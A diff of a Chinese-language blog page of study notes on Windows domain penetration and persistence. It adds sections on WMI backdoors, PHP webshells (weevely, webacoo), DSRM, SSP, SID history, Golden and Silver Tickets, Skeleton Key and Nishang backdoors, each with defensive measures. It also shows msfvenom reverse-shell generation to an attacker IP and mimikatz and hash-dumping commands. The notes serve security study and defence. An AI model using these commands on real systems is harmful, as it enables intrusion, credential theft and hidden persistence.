@@ -33,8 +33,11 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://kizureina.github.io/images/image-20240611155334313.png">
 <meta property="og:image" content="https://kizureina.github.io/images/image-20240611155429632.png">
+<meta property="og:image" content="https://kizureina.github.io/images/image-20240611195751222.png">
+<meta property="og:image" content="https://kizureina.github.io/images/image-20240611195945053.png">
+<meta property="og:image" content="https://kizureina.github.io/images/image-20240611200048921.png">
 <meta property="article:published_time" content="2024-06-11T06:53:04.000Z">
-<meta property="article:modified_time" content="2024-06-11T09:47:08.541Z">
+<meta property="article:modified_time" content="2024-06-11T14:06:40.185Z">
 <meta property="article:author" content="Kizurena">
 <meta property="article:tag" content="Web Computer Science Anime Comic Galgame">
 <meta name="twitter:card" content="summary">
@@ -377,7 +380,7 @@
   
           </div>
           <div class="wordcount need-seperator meta-info">
-            7k 词 
+            9.2k 词 
           </div>
         </div>
         
@@ -779,7 +782,7 @@
 <p>（注意：这部分是如何使用msf在可以执行命令的机器上getshell，与Cobalt Strike类似）</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler <span class="comment"># 使用模块</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp <span class="comment"># 设置payload，与木马中-p指定的完全相同</span></span><br><span class="line"><span class="built_in">set</span> lhost &lt;攻击机ip&gt;</span><br><span class="line"><span class="built_in">set</span> lport &lt;攻击机监听端口&gt;</span><br><span class="line">exploit -j -z <span class="comment"># 后台进行监听，等待靶机执行木马程序</span></span><br></pre></td></tr></table></figure>
 
-<p>之后便能获取到meterpreter shell.</p>
+<p><img src="/../images/image-20240611195751222.png" alt="image-20240611195751222"></p>
 <p>使用msfvenom生成木马程序：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;反弹的目的IP&gt; LPORT=&lt;反弹的</span><br><span class="line">目的端口&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
 
@@ -791,10 +794,12 @@
 <li>LHOST 与LPORT一般指向攻击机的ip与监听的端口</li>
 </ul>
 </blockquote>
-<p>靶机执行shell.exe木马时，会在msf上看到反弹shell的连接。</p>
-<p>获取到Meterpreter shell之后，再获取域账号和域散列值：</p>
+<p>靶机执行shell.exe木马时，会在msf上看到反弹shell的连接:</p>
+<p><img src="/../images/image-20240611195945053.png" alt="image-20240611195945053"></p>
+<p>获取到Meterpreter shell之后，再获取域账号和域散列值(需要管理员权限)：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/credentials/domain_hashdump</span><br><span class="line"><span class="built_in">set</span> session 1 </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
+<p><img src="/../images/image-20240611200048921.png" alt="image-20240611200048921"></p>
 <h2 id="使用vshadow-exe和QuarksPwDump-exe导出域账号和域散列值"><a href="#使用vshadow-exe和QuarksPwDump-exe导出域账号和域散列值" class="headerlink" title="使用vshadow.exe和QuarksPwDump.exe导出域账号和域散列值"></a>使用vshadow.exe和QuarksPwDump.exe导出域账号和域散列值</h2><p><a target="_blank" rel="noopener" href="https://github.com/quarkslab/quarkspwdump">QuarksPwDump.exe</a>可以快速安全、全面地读取全部域账号和域散列值。</p>
 <h2 id="Kerberos域用户提权漏洞分析与防范"><a href="#Kerberos域用户提权漏洞分析与防范" class="headerlink" title="Kerberos域用户提权漏洞分析与防范"></a>Kerberos域用户提权漏洞分析与防范</h2><p>如果攻击者获取了域内任何一台计算机的Shell权限，同时知道任意域用户的用户名、SID、密码，即可获得域管理员权限，进而控制域控制器，最终获得域权限。</p>
 <blockquote>
@@ -846,12 +851,167 @@
 </ul>
 <h2 id="操作系统后门分析与防范"><a href="#操作系统后门分析与防范" class="headerlink" title="操作系统后门分析与防范"></a>操作系统后门分析与防范</h2><p>操作系统后门：绕过目标系统安全控制体系的正规用户认证过程，来维持对目标系统的控制权及隐匿控制行为的方法。</p>
 <h3 id="常用操作系统后门"><a href="#常用操作系统后门" class="headerlink" title="常用操作系统后门"></a>常用操作系统后门</h3><ul>
-<li>粘滞键后门：通过替换粘滞键可执行文件，可以以System权限执行命令 </li>
-<li>注册表注入后门：将可执行文件写入到注册表键的启动项中，在登录时便能执行后门程序 </li>
+<li>粘滞键后门：通过用cmd.exe替换粘滞键可执行文件<code>\windows\system32\sethc.exe</code>，可以以System权限执行命令 </li>
+<li>注册表注入后门：将可执行文件写入到注册表键的<em>启动项</em>中，在登录时便能执行后门程序 </li>
 <li>计划任务后门：通过计划任务自动执行或生成后门程序 </li>
 <li>meterpreter后门：meterpreter自带，使用安装自启动方式的持久性后门程序 </li>
 <li>Cymothoa后门：将shellcode注入到现有进程中的后门程序</li>
 </ul>
+<h3 id="WMI后门"><a href="#WMI后门" class="headerlink" title="WMI后门"></a>WMI后门</h3><p>特定：</p>
+<ul>
+<li>只能由由<em>管理员权限</em>的用户运行 </li>
+<li>使用powershell编写 </li>
+<li>可以直接从新的WMI属性中读取和执行后门代码，给代码加密</li>
+</ul>
+<p>优势：无文件，无进程</p>
+<p>原理： </p>
+<ol>
+<li>无文件：将代码加密存储于WMI中,实现无文件</li>
+<li>无进程：满足条件时，系统自动powershell进程执行后门程序，执行后进程消失，实现无进程</li>
+</ol>
+<h2 id="Web后门分析与防范"><a href="#Web后门分析与防范" class="headerlink" title="Web后门分析与防范"></a>Web后门分析与防范</h2><p>即WebShell，精心构造的网页代码实现权限维持的后门。</p>
+<h3 id="weevely后门"><a href="#weevely后门" class="headerlink" title="weevely后门"></a>weevely后门</h3><p><a target="_blank" rel="noopener" href="https://github.com/epinna/weevely3">python编写的针对php的webshell</a> </p>
+<p>使用方法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成WebShell</span></span><br><span class="line">weevely generate &lt;密码&gt; &lt;生成文件路径&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将生成的.php文件上传到目标机器，并且能通过外网访问到文件，此时可以连接WebShell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely &lt;目标url,以文件名结尾&gt; &lt;密码&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="weabacoo后门"><a href="#weabacoo后门" class="headerlink" title="weabacoo后门"></a>weabacoo后门</h3><p>也是针对PHP平台的Web后门工具。 </p>
+<p>制作后门工具: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webacoo -g -o &lt;生成文件路径&gt; </span><br></pre></td></tr></table></figure>
+
+<p>如何连接webShell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webacoo -t -u &lt;目标url&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="域控制器权限持久化分析与防范"><a href="#域控制器权限持久化分析与防范" class="headerlink" title="域控制器权限持久化分析与防范"></a>域控制器权限持久化分析与防范</h2><h3 id="DSRM目录恢复模式"><a href="#DSRM目录恢复模式" class="headerlink" title="DSRM目录恢复模式"></a>DSRM目录恢复模式</h3><p>DSRM(DirectoryServicesRestoreMode,目录服务恢复模式）是Windows域环境中域控制器的安全模式启动选项。 </p>
+<p>每个域控制器都有一个本地管理员账户（也就是DSRM账户）。 </p>
+<p>DSRM允许管理员在域环境中出现故障或崩溃时还原、修复、重建活动目录数据库，使域环境的运行恢复正常。</p>
+<p>修改DSRM密码最基本的方法是在<strong>DC</strong>上运行ntdsutil命令行工具。</p>
+<p>因此可以通过DSPM实现对域环境的权限持久化。</p>
+<p>具体步骤：</p>
+<ol>
+<li>使用mimikatz查看krbtgt的NTLMHash</li>
+<li>使用mimikatz查看并读取SAM文件中本地管理员的NTLM Hash</li>
+<li>将DSRM账号和krbtgt的NTLM Hash同步</li>
+<li>查看DSRM的NTLMHash是否同步成功</li>
+<li>修改DSRM的登录方式：新建注册表<code>HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior</code>并配置为“2”：在任何情况下，都可以使用DSRM管理员账号登录域控制器。</li>
+<li>使用DSRM账号通过网络远程登录域控制器</li>
+<li>使用mimikatz的dcysnc功能远程转储krbtgt的NTLM Hash</li>
+</ol>
+<p>此时完成哈希传递，会打开一个命令行。</p>
+<h4 id="防范-3"><a href="#防范-3" class="headerlink" title="防范"></a>防范</h4><p>■ 定期检查注册表中用于控制DSRM登录方式的键值HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior,确认该键值为1,或者删除该键值。</p>
+<p>■ 定期修改域中所有域控制器的DSRM账号。</p>
+<p>■ 经常检查ID为4794的日志。尝试设置活动目录服务还原模式的管理员密码会被记录在4794日志中。</p>
+<h3 id="SSP维持域控权限"><a href="#SSP维持域控权限" class="headerlink" title="SSP维持域控权限"></a>SSP维持域控权限</h3><p>SSP(Security Support Provider)是Windows操作系统安全机制的提供者。 </p>
+<p>简单地说，SSP就是一个DLL文件，主要用来实现Windows操作系统的身份认证功能。</p>
+<blockquote>
+<p>基本原理：</p>
+<p>LSA(Local Security Authority)用于身份验证；<strong>lsass.exe</strong>作为Windows的系统进程，用于本地安全和登录策略；在系统启动时，SSP将被加载到lsasS.exe进程中。</p>
+<p>但是，假如攻击者对LSA进行了扩展，自定义了恶意的DLL文件，在系统启动时将其加载到lsass.exe进程中，就能够获取lsass.exe进程中的明文密码。这样，即使用户更改密码并重新登录，攻击者依然可以获取该账号的新密码。</p>
+</blockquote>
+<h4 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h4><p>■ 检査HKEY_LOCAL_MACHINE&#x2F;System&#x2F;CurrentControlSet&#x2F;Control&#x2F;Lsa&#x2F;SecurityPackages项中是否含有可疑的DLL文件。</p>
+<p>■ 检查C:\Windows\System32\目录下是否有可疑的DLL文件。</p>
+<p>■ 使用第三方工具检查LSA中是否有可疑的DLL文件。</p>
+<h3 id="SID-history"><a href="#SID-history" class="headerlink" title="SID history"></a>SID history</h3><p>每个用户都有自己的SID。 </p>
+<p>SID的作用主要是跟踪安全主体控制用户连接资源时的访问权限。 </p>
+<p>SIDHistory是在域迁移过程中需要使用的一个属性，用于在域迁移过程中保持域用户的<em>访问权限</em>。</p>
+<p>利用需要有<strong>域管理员权限</strong>。</p>
+<p>使用mimikatz:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sid::add /sam:<span class="built_in">test</span> /new:administrator</span><br></pre></td></tr></table></figure>
+
+<h4 id="防范措施-1"><a href="#防范措施-1" class="headerlink" title="防范措施"></a>防范措施</h4><p>■ 经常査看域用户中SID为500的用户。</p>
+<p>■ 完成域迁移工作后，对有相同SIDHistoiy属性的用户进行检查。</p>
+<p>■ 定期检査ID为4765和4766的日志。4765为将SIDHistory属性添加到用户的日志。4766为将SIDHistory属性添加到用户失败的日志。</p>
+<h3 id="Golden-Ticket（重要）"><a href="#Golden-Ticket（重要）" class="headerlink" title="Golden Ticket（重要）"></a>Golden Ticket（重要）</h3><p>在安全运维过程中，如果发现系统中存在恶意行为，应及时<strong>更改域管理员密码</strong>，对受控机器进行断网处理，然后进行日志分析及取证。</p>
+<p>然而，攻击者往往会给自己留下多条进入内网的通道,如果我们忘记将<em>krbtgt</em>账号重置，攻击者就能快速重新拿回域控制器权限。</p>
+<blockquote>
+<p>krbtgt是<em>KDC服务</em>使用的账号，属于Domain Admins组。</p>
+<p>在域环境中，每个用户账号的<strong>票据</strong>都是由<strong>krbtgt</strong>生成的，如果攻击者拿到了krbtgt的NTLM Hash或者AES-256值，就可以伪造域内<strong>任意用户</strong>的身份，并以该用户的身份访问其他服务。</p>
+</blockquote>
+<h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><ol>
+<li>导出krbtgt的NTLM Hash </li>
+<li>获取域SID：<code>wmic useraccount get name,sid</code></li>
+<li>获取当前用户SID：<code>whoami /user</code></li>
+<li>查询管理员账号:<code>net group &quot;domain admins&quot; /domain</code></li>
+<li>查询域名:<code>ipconfig /all</code></li>
+<li>生成票据 </li>
+<li>清空票据 </li>
+<li>注入票据</li>
+</ol>
+<p>注：使用krbtgt的AES-256值生成票据并将其注人内存，也可以伪造用户。之前导出的krbtgt信息中就有这个值。</p>
+<h4 id="防范-4"><a href="#防范-4" class="headerlink" title="防范"></a>防范</h4><p>■ 使用GoldenTicket伪造的用户可以是<strong>任意用户</strong>，即使这个用户不存在</p>
+<p>■ 提升域功能级别时修改krbtgt的密码</p>
+<p>■ 用户自行进行安全检查和相关服务加固时修改krbtgt的密码</p>
+<h3 id="SilverTicket"><a href="#SilverTicket" class="headerlink" title="SilverTicket"></a>SilverTicket</h3><p>与黄金票据的不同：</p>
+<p>1.获取的权限不同：</p>
+<ul>
+<li>金票：伪造的TGT（票据授权服务产生的票据文件），可以获取任意Kerberos的访问权限 </li>
+<li>银票：伪造的ST，只能访问指定的服务，如CIFS</li>
+</ul>
+<ol start="2">
+<li>认证流程不同：</li>
+</ol>
+<ul>
+<li>金票：与KDC交互，但不与AS交互 </li>
+<li>银票：不与KDC交互，直接访问Server</li>
+</ul>
+<ol start="3">
+<li>加密方式不同：</li>
+</ol>
+<ul>
+<li>金票：由krbtgt NTLM Hash 加密 </li>
+<li>银票：由服务账号 NTLM Hash 加密</li>
+</ul>
+<h4 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h4><p>使用SilverTicket伪造CIFS服务权限：</p>
+<blockquote>
+<p>与黄金票据类似，只是在使用mimikatz生成伪造的Silver Ticket</p>
+</blockquote>
+<p>获取服务账号NTLM Hash </p>
+<ol>
+<li>查询域名 </li>
+<li>获取域SID </li>
+<li>获取伪造的目标用户名 </li>
+<li>生成票据 </li>
+<li>清空票据 </li>
+<li>注入票据</li>
+</ol>
+<p>使用SilverTicket伪造LDAP服务权限，与之类似。</p>
+<h4 id="防御措施-1"><a href="#防御措施-1" class="headerlink" title="防御措施"></a>防御措施</h4><p>■ 在内网中安装杀毒软件，及时更新系统补丁。</p>
+<p>■ 使用组策略在域中进行相应的配置，限制mimikatz在网络中的使用。</p>
+<p>■ 计算机的账号和密码默认每30天更改一次。检查该设置是否生效。</p>
+<h3 id="Skeleton-Key"><a href="#Skeleton-Key" class="headerlink" title="Skeleton Key"></a>Skeleton Key</h3><p>使用Skeleton Key(万能密码），可以对域内权限进行持久化操作。</p>
+<p>攻击流程：</p>
+<p>使用mimikatz将SkeletonKey注人域控制器的lsass.exe进程：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>
+
+<p>此时，会在域内的所有账号中添加一个SkeletonKey,其密码默认为mimikatz。</p>
+<p>然后使用域管理员账号和SkeletonKey与域控制器建立ipc$：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\dc08\ipc$ <span class="string">&quot;mimikatz&quot;</span> /user:<span class="string">&quot;pentest\administrator&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="防御措施-2"><a href="#防御措施-2" class="headerlink" title="防御措施"></a>防御措施</h4><p>■ 域管理员用户要设置强口令，确保恶意代码不会在域控制器中执行。</p>
+<p>■ 在所有域用户中启用双因子认证，例如智能卡认证。</p>
+<p>■ 启动应用程序白名单（例如AppLocker),以限制mimikatz在域控制器中的运行。</p>
+<h2 id="Nishang下的脚本后门分析与防范"><a href="#Nishang下的脚本后门分析与防范" class="headerlink" title="Nishang下的脚本后门分析与防范"></a>Nishang下的脚本后门分析与防范</h2><p>Nishang是基于PowerShell的渗透测试工具，集成了很多框架、脚本及各种Payload。</p>
+<ol>
+<li><p><em>HTTP-Backdoor</em>脚本可以帮助攻击者在目标主机上下载和执行PowerShell脚本，接收来自第三方网站的指令，在内存中执行PowerShell脚本，</p>
+<p> ■ -CheckURL：给出一个URL地址。如果该地址存在，MagicString中的值就会执行Payload,下载并运行攻击者的脚本。</p>
+<p> ■ -PayloadURL：给出需要下载的PowerShell脚本的地址。</p>
+<p> ■ -StopString：判断是否存在CheckURL返回的字符串，如果存在则停止执行。</p>
+</li>
+<li><p><em>Add-ScrnSaveBackdoor</em>脚本可以帮助攻击者利用Windows的屏幕保护程序来安插一个隐藏的后门</p>
+<p> ■ -PayloadURL：指定需要下载的脚本的地址。</p>
+<p> ■ -Arguments：指定需要执行的函数及相关参数。</p>
+</li>
+<li><p><em>Execute-OnTime</em>脚本用于在目标主机上指定PowerShell脚本的执行时间</p>
+<p> ■ -PayloadURL:指定下载的脚本的地址。</p>
+<p> ■ -Arguments：指定要执行的函数名。</p>
+<p> ■ -Time:设置脚本执行的时间，例如“-Time23:21”。</p>
+<p> ■ -CheckURL：检测一个指定的URL里是否存在StopString给出的字符串，如果存在就停止执行。</p>
+</li>
+<li><p>Invoke-ADSBackdoor脚本能够向ADS注入代码并以普通用户权限运行。</p>
+</li>
+</ol>
 
         
       </div>
